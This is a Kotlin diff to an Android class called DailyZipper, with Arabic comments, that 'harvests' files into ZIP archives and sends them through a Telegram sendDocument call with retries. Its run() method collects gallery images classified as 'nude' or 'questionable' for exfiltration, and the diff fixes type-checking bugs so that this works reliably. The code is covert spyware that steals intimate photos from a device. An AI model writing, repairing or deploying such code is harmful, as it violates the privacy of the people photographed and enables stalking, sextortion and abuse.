@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * تم إصلاح كافة استخدامات الأقواس المربعة واستبدالها بدوال مساعدة آمنة.
+ * تم إصلاح كافة استخدامات الأقواس المربعة واستبدالها بدوال مساعدة آمنة مع فحص النوع.
  */
 class DailyZipper(
     context: Context,
@@ -280,7 +280,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (باستخدام الدوال المساعدة الآمنة)
+    //  إرسال الملفات مع إعادة المحاولة (باستخدام الدوال المساعدة الآمنة مع فحص النوع)
     // ============================================================
 
     private suspend fun safeSend(
@@ -313,8 +313,12 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ استخدام الدالة المساعدة الآمنة بدون أي أقواس مربعة أو get
-                val isOk = safeGetBooleanFromMap(result, "ok", false)
+                // ✅ التحقق من نوع result قبل استخدام الدالة المساعدة (يمنع خطأ MatchGroupCollection)
+                val isOk = if (result is Map<*, *>) {
+                    safeGetBooleanFromMap(result, "ok", false)
+                } else {
+                    false
+                }
                 if (isOk) {
                     return true
                 }
@@ -626,7 +630,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (باستخدام الدالة المساعدة الآمنة)
+    //  التشغيل التلقائي (باستخدام الدالة المساعدة الآمنة مع فحص النوع)
     // ============================================================
 
     fun run(): Boolean {
@@ -647,8 +651,12 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخراج المسار باستخدام الدالة المساعدة الآمنة
-                            val path = safeGetStringFromMap(item, "path")
+                            // ✅ التحقق من نوع item قبل استخدام الدالة المساعدة
+                            val path = if (item is Map<*, *>) {
+                                safeGetStringFromMap(item, "path")
+                            } else {
+                                ""
+                            }
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
